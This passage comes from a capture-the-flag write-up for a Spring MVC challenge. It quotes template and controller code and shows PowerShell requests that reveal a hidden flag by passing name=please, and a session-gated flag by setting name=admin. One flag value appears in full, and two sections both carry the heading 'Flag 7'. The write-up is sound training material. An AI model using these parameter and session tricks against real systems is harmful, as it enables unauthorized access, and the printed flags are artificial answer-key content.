@@ -146,3 +146,56 @@ As the chall gave the [source code](./Project) only simple 'code review' is nece
     </body>
     </html>
 ```
+## Flag 7
+
+### Code
+```html
+	<p th:if="${name == 'please'}">
+	<span class="hidden" th:text="${@flagService.getFlag('hidden_flag')}" />
+	</p>
+```
+### Request
+```powershell
+(Invoke-WebRequest http://challenges.ctfd.io:30542/?name=please).Content
+<!DOCTYPE HTML>
+<html>
+<head>
+    <title>Tenable CTF: Spring MVC</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <style type="text/css">
+        span.hidden { color:white; }
+    </style>
+</head>
+<body>
+        <p >Hello, please!</p>
+        <p>
+        <span class="hidden" >flag{hidden_flag_1dbc4}</span>
+        </p>
+
+</body>
+</html>
+```
+## Flag 7
+
+### Code
+```Java
+	@GetMapping("/other")
+	public String index(@RequestParam(name="name", required=false, defaultValue="user") String realName, HttpSession session, Model model) {
+		session.setAttribute("realName", realName);
+		model.addAttribute("name", realName);
+		return "hello";
+	}
+```
+```html
+	<p th:if="${#session.getAttribute('realName') == 'admin'}">
+	<span th:text="${#session.getAttribute('sessionFlag')}" />
+	</p>
+```
+### Request
+```powershell
+Write-Output 'Set Session';(Invoke-WebRequest http://challenges.ctfd.io:30541/other?name=admin -SessionVariable session).StatusCode;(Invoke-WebRequest http://challenges.ctfd.io:30541/ -WebSession $session).Content
+```
+
+
+
+	
